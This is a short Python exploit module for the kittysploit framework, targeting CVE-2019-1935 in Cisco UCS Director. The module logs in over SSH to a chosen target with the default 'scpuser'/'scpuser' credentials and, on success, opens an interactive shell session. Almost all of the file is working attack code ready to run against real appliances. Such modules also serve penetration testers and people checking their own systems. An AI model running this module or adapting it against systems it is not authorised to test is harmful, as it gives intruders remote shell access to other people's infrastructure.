from kittysploit import *
from lib.protocols.ssh.ssh_client import Ssh_client

class Module(Exploit, Ssh_client):


    __info__ = {
            'name': 'Cisco UCS Director default scpuser password',
            'description': "The 'scpuser' has the password of 'scpuser', and allows an attacker to login to the virtual appliance via SSH",
            'cve': '2019-1935',
            'platform': Platform.LINUX,
            'payload': {
                'default':'nopayload',
                }			
        }

    ssh_target = OptString("", "Target IPv4", "yes")
    ssh_port = OptPort(22, "Target SSH port", "yes")

    def run(self):
        client = self.open_ssh(user="scpuser", password="scpuser")
        connection = client.login()
        if connection:
            self.handler_ssh(connection)
        else:
            self.not_vulnerable()